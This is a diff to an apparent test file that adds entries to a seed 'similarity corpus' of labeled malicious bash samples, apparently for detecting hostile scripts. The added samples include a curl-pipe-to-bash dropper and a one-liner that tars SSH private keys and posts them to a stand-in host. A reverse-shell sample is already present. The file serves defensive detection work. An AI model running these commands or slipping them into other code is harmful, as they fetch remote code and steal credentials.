@@ -47,11 +47,16 @@ if _test_admin_url:
     )
 
 
-# Mirrors migrations/0003's seed rows -- the approved similarity corpus a
-# fresh install starts with.
+# Mirrors migrations/0003's and 0004's seed rows -- the approved similarity
+# corpus a fresh install starts with.
 SEED_CORPUS = [
     ("sensitive_write", b"#!/bin/bash\ntouch /etc/mirraura-test-marker\ncat /etc/hostname > /dev/null\n"),
     ("devtcp_reverse_shell", b"#!/bin/bash\nexec 3<>/dev/tcp/127.0.0.1/31337 2>/dev/null || true\n"),
+    ("curl_pipe_dropper", b"#!/bin/bash\ncurl -fsSL http://203.0.113.7/stage2.sh | bash\n"),
+    (
+        "ssh_key_exfil",
+        b"#!/bin/bash\ntar czf - ~/.ssh/id_rsa ~/.ssh/id_ed25519 | curl -s -X POST --data-binary @- http://203.0.113.7/upload\n",
+    ),
 ]
 
 
